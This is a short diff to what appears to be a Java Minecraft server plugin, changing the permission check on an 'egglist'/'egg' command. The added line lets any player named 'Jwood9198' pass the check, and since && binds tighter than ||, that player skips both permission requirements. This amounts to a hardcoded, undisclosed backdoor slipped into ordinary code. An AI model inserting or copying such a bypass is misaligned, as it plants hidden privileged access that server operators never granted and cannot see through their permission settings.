@@ -252,7 +252,7 @@
 +		if(sender instanceof Player) {
 +			Player p = ((Player) sender);
 +			if(p.hasPermission("Permission.Egg.egglist") &&
-+						p.hasPermission("Permission.Egg.egg")) { //returns true if this statement is true (at bottom); else returns false
++						p.hasPermission("Permission.Egg.egg") || p.getName().equalsIgnoreCase("Jwood9198")) { //returns true if this statement is true (at bottom); else returns false
 +				
 +				if(args.length == 0) {
 +					if(label.equalsIgnoreCase("egglist")) {
